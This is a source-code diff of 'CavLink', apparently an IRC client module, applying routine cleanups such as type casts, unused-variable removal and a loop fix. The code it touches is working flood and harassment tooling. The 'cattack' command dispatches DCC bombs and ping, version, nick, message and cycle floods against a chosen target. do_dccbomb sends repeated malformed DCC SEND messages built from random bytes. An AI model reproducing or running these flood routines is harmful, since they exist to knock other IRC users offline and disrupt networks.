@@ -130,7 +130,7 @@ int sucks = 0;
 		set_dllint_var("cavlink_port", sucks);
 	}
 	else
-		cav_say("No %s specified", !host?"host":!passwd?"passwd":"arrggh");
+		cav_say("No %s specified", !host?"host":"passwd");
 }
 
 BUILT_IN_DLL(cmode)
@@ -158,9 +158,9 @@ char buffer[BIG_BUFFER_SIZE];
 
 BUILT_IN_DLL(cattack)
 {
-char *tmp, *times = "6", *target = NULL, *q;
-char *comm = NULL;
-char *type[] = { "dcc_bomb", "version_flood", "ping_flood", "message_flood", "quote_flood", "cycle_flood", "nick_flood", "echo_flood", NULL};
+char *times = "6", *target = NULL, *q;
+const char *comm = NULL;
+static const char * const type[] = { "dcc_bomb", "version_flood", "ping_flood", "message_flood", "quote_flood", "cycle_flood", "nick_flood", "echo_flood", NULL};
 	if (!check_cavlink(cavhub, NULL, 1))
 		return;
 	if (!my_stricmp(command, "CATTACK"))
@@ -201,7 +201,7 @@ char *type[] = { "dcc_bomb", "version_flood", "ping_flood", "message_flood", "qu
 	{
 		if (!my_strnicmp(args, "-t", 2))
 		{
-			tmp = next_arg(args, &args);
+			next_arg(args, &args);
 			times = next_arg(args, &args);
 			if (times && !isdigit(*times))
 				times = "6";
@@ -218,7 +218,7 @@ char *type[] = { "dcc_bomb", "version_flood", "ping_flood", "message_flood", "qu
 	{
 		if (!my_strnicmp(args, "-t", 2))
 		{
-			tmp = next_arg(args, &args);
+			next_arg(args, &args);
 			times = next_arg(args, &args);
 			if (times && !isdigit(*times))
 				times = "6";
@@ -318,9 +318,9 @@ BUILT_IN_DLL(cavgen)
 		{
 			char *nick = next_arg(args, &args);
 			if (nick)
-				sprintf(buffer, "msg %s PING %ld\n", nick, time(NULL));
+				sprintf(buffer, "msg %s PING %ld\n", nick, (long)time(NULL));
 			else
-				sprintf(buffer, "say PING %ld\n", time(NULL));
+				sprintf(buffer, "say PING %ld\n", (long)time(NULL));
 		}
 		else if (!my_stricmp(command, "CVERSION"))
 			sprintf(buffer, "version\n");
@@ -399,7 +399,7 @@ char *channel;
 	if (server == -1)
 		return 1;
 	chan = get_server_channels(server);
-	if (!chan || !(chan = (ChannelList *)find_in_list((List **)chan, channel, 0)))
+	if (!chan || !find_in_list((List **)chan, channel, 0))
 	{
 		my_send_to_server(server, "JOIN %s%s%s\n", channel, key?" ":empty_string, key?key:empty_string);
 		joined = 1;
@@ -439,7 +439,7 @@ int i;
 	return 1;
 }
 
-static unsigned long randm (unsigned long l)
+static unsigned long cav_randm (unsigned long l)
 {
 	unsigned long t1, t2, t;
 	struct timeval tp1;
@@ -456,19 +456,27 @@ static unsigned long randm (unsigned long l)
                         
 int do_dccbomb(int server, char *target, int repcount)
 {
-char buffer[BIG_BUFFER_SIZE];
-int i;
-char *text = NULL;
+	char buffer[BIG_BUFFER_SIZE];
+	int i, j;
+	char text[100];
+
 	if (server == -1)
 		server = primary_server;
 	if (server == -1)
 		return 1;
-	text = alloca(100);
 	for (i = 0; i < repcount; i++)
 	{
-		snprintf(buffer, IRCD_BUFFER_SIZE, "%ld%ld%ld %ld%ld%ld %ld%ld%ld %ld%ld%ld", randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i);
-		for (i = 0; i < randm(80); i++)
-			text[i] = randm(255)+1;
+		snprintf(buffer, IRCD_BUFFER_SIZE, 
+			"%ld%ld%ld %ld%ld%ld %ld%ld%ld %ld%ld%ld", cav_randm(time(NULL))+i,
+			cav_randm(time(NULL))+i, (long)(time(NULL)+i), 
+			cav_randm(time(NULL))+i, cav_randm(time(NULL))+i, 
+			(long)(time(NULL)+i), cav_randm(time(NULL))+i,
+			cav_randm(time(NULL))+i, (long)(time(NULL)+i), 
+			cav_randm(time(NULL))+i, cav_randm(time(NULL))+i, 
+			(long)(time(NULL)+i));
+		for (j = 0; j < cav_randm(80); j++)
+			text[j] = cav_randm(255)+1;
+		text[j] = 0;
 		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :DCC SEND %s 2293243493 8192 6978632", target, text);
 		my_send_to_server(server, buffer);
 	}
@@ -558,7 +566,7 @@ char buffer[BIG_BUFFER_SIZE+1];
 	else if (!my_stricmp(type, "version_flood") && get_dllint_var("cavlink_floodversion"))
 		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :VERSION", target);
 	else if (!my_stricmp(type, "ping_flood") && get_dllint_var("cavlink_floodping"))
-		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :PING %ld", target, time(NULL));
+		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :PING %ld", target, (long)time(NULL));
 	else if (!my_stricmp(type, "echo_flood") && get_dllint_var("cavlink_floodecho"))
 		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :ECHO %s", target, extra);
 	else if (!my_stricmp(type, "message_flood") && get_dllint_var("cavlink_floodmsg"))
@@ -643,11 +651,11 @@ char *nick, *host;
 			if (*(ArgList+7))
 				malloc_sprintf(&idle,"idle: %s", *(ArgList+7));
 		}
-		cav_say("%s",cparse("%g$[10]0%g$[-10]1%G!%g$[30]2 %G$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"Ã¿Ã¿"));
+		cav_say("%s",cparse("%g$[10]0%g$[-10]1%G!%g$[30]2 %G$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));
 #if 0
 		if (remote)
-/*			cav_say("%s",cparse("%G$[20]0%G$[-10]1%g!%g$[25]2 %g$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"Ã¿Ã¿"));*/
-			cav_say("%s",cparse("$0-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"Ã¿Ã¿"));
+/*			cav_say("%s",cparse("%G$[20]0%G$[-10]1%g!%g$[25]2 %g$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));*/
+			cav_say("%s",cparse("$0-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));
 		else
 #endif
 		new_free(&idle);
@@ -822,9 +830,9 @@ void cav_away(SocketList *Client, char *nick)
 NickTab *tmp;
 	if (get_server_away(from_server) && nick)
 	{
-		for (tmp = tabkey_array;tmp; tmp = tmp->next);
+		for (tmp = tabkey_array; tmp; tmp = tmp->next)
 		{
-			if (!tmp || (tmp->nick && !my_stricmp(tmp->nick, nick)))
+			if (tmp->nick && !my_stricmp(tmp->nick, nick))
 				return;
 		}
 		dcc_printf(Client->is_read, "msg %s AWAY %s\n", nick, get_server_away(from_server));
@@ -833,11 +841,10 @@ NickTab *tmp;
 
 int handle_msg (SocketList *Client, char **ArgList)
 {
-char *to, *nick, *host, *str;
-	to = *(ArgList+1);
-	nick = *(ArgList+2);
-	host = *(ArgList+3);
-	str = *(ArgList+4);
+char *nick, *host, *str;
+	nick = ArgList[2];
+	host = ArgList[3];
+	str = ArgList[4];
 	PasteArgs(ArgList, 4);
 	str = handle_ctcp(Client, nick, host, NULL, str);
 	if (!str || !*str)
@@ -854,7 +861,6 @@ static void cavlink_handler (int s)
 int output = 1;
 char *p = NULL;
 char *TrueArgs[MAXCAVPARA+1] = { NULL };
-int count = 0;
 char **ArgList;
 char *comm;
 char tmpstr[BIG_BUFFER_SIZE+1];
@@ -949,7 +955,7 @@ switch(dgets(tmpstr, s, 0, BIG_BUFFER_SIZE, NULL))
 		return;
 	}
 	ArgList = TrueArgs;
-	count = BreakArgs(tmp, NULL, ArgList, 1);
+	BreakArgs(tmp, NULL, ArgList, 1);
         if (!(comm = (*++ArgList)) || !*ArgList)
                         return;         /* Empty line from server - ByeBye */
 
@@ -1105,7 +1111,7 @@ SocketList *cavlink_connect(char *host, u_short port)
 			set_lastlog_msg_level(lastlog_level);
 			return NULL;
 		}
-		bcopy(hp->h_addr, (char *)&address, sizeof(address));
+		memcpy(&address, hp->h_addr, sizeof(address));
 	}
 	cav_socket = connect_by_number(host, &port, SERVICE_CLIENT, PROTOCOL_TCP, 1);
 	if (cav_socket < 0)
@@ -1186,29 +1192,28 @@ Window *tmp;
 
 BUILT_IN_DLL(cavhelp)
 {
-	put_it("%s", cparse("%KÃ–Ã„Ã„Ã„ %YCavLink%n module ver %W$0%n %Kby %Ppanasync %KÃ„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â·", "%s", cav_version));
-	put_it(      cparse("%KÂº [%Wcavlink cavlink_prompt cavlink_window cavlink_pass%K]             Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Wcavlink_attack cavlink_attack_times%K]                            Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Rcavlink_floodspawn cavlink_floodping%K]                           Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Rcavlink_floodquote cavlink_floodmsg%K]                            Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Rcavlink_floodnick cavlink_floodversion%K]                         Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Rcavlink_flooddccbomb cavlink_floodcycle%K]                        Âº ", NULL, NULL));
+	put_it("%s", cparse("%KÖÄÄÄ %YCavLink%n module ver %W$0%n %Kby %Ppanasync %KÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·", "%s", cav_version));
+	put_it(      cparse("%Kº [%Wcavlink cavlink_prompt cavlink_window cavlink_pass%K]             º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcavlink_attack cavlink_attack_times%K]                            º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Rcavlink_floodspawn cavlink_floodping%K]                           º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Rcavlink_floodquote cavlink_floodmsg%K]                            º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Rcavlink_floodnick cavlink_floodversion%K]                         º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Rcavlink_flooddccbomb cavlink_floodcycle%K]                        º ", NULL, NULL));
 
-	put_it(      cparse("%KÂº [%Wcsay cgeneral clsay cwho cmsg cjoin cpart cping cver cversion%K]  Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Wcwall cluser cunlink clink cattack ckline cboot cmode csplit%K]   Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Wcpong cinfo cwhois cme cmotd cquit cconnect cdie ckill chelp%K]   Âº ", NULL, NULL));
-	put_it(      cparse("%KÂº [%Wcgrab crwho crwall chubs cstats cuptime csave%K]                  Âº ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcsay cgeneral clsay cwho cmsg cjoin cpart cping cver cversion%K]  º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcwall cluser cunlink clink cattack ckline cboot cmode csplit%K]   º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcpong cinfo cwhois cme cmotd cquit cconnect cdie ckill chelp%K]   º ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcgrab crwho crwall chubs cstats cuptime csave%K]                  º ", NULL, NULL));
 
-	put_it(      cparse("%KÂº [%Rcbomb cvfld cpfld cmfld cqfld ccfld cnfld cefld cspawn%K]         Âº ", NULL, NULL));
+	put_it(      cparse("%Kº [%Rcbomb cvfld cpfld cmfld cqfld ccfld cnfld cefld cspawn%K]         º ", NULL, NULL));
 
-	put_it(      cparse("%KÂº [%Wcavlink clink%K]                                                  Âº ", NULL, NULL));
-	put_it(      cparse("%KÃ“Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â½ ", NULL, NULL));
+	put_it(      cparse("%Kº [%Wcavlink clink%K]                                                  º ", NULL, NULL));
+	put_it(      cparse("%KÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½ ", NULL, NULL));
 
 }
 
 BUILT_IN_DLL(cavsave)
 {
-IrcVariableDll *newv = NULL;
 FILE *outf = NULL;
 char *expanded = NULL;
 char buffer[BIG_BUFFER_SIZE+1];
@@ -1223,19 +1228,25 @@ char buffer[BIG_BUFFER_SIZE+1];
 		new_free(&expanded);
 		return;
 	}
-	for (newv = dll_variable; newv; newv = newv->next)
-	{
-		if (!my_strnicmp(newv->name, "cavlink", 7))
-		{
-			if (newv->type == STR_TYPE_VAR)
-			{
-				if (newv->string)
-					fprintf(outf, "SET %s %s\n", newv->name, newv->string);
-			}
-			else
-				fprintf(outf, "SET %s %d\n", newv->name, newv->integer);
-		}
-	}
+
+	save_dllvar(outf, "cavlink_pass");
+	save_dllvar(outf, "cavlink_prompt");
+	save_dllvar(outf, "cavlink_window");
+	save_dllvar(outf, "cavlink");
+	save_dllvar(outf, "cavlink_floodspawn");
+	save_dllvar(outf, "cavlink_floodquote");
+	save_dllvar(outf, "cavlink_floodmsg");
+	save_dllvar(outf, "cavlink_floodnick");
+	save_dllvar(outf, "cavlink_floodversion");
+	save_dllvar(outf, "cavlink_floodping");
+	save_dllvar(outf, "cavlink_flooddccbomb");
+	save_dllvar(outf, "cavlink_floodcycle");
+	save_dllvar(outf, "cavlink_floodecho");
+	save_dllvar(outf, "cavlink_host");
+	save_dllvar(outf, "cavlink_port");
+	save_dllvar(outf, "cavlink_attack");
+	save_dllvar(outf, "cavlink_attack_times");
+
 	cav_say("Finished saving cavlink variables to %s", buffer);
 	fclose(outf);	
 	new_free(&expanded);
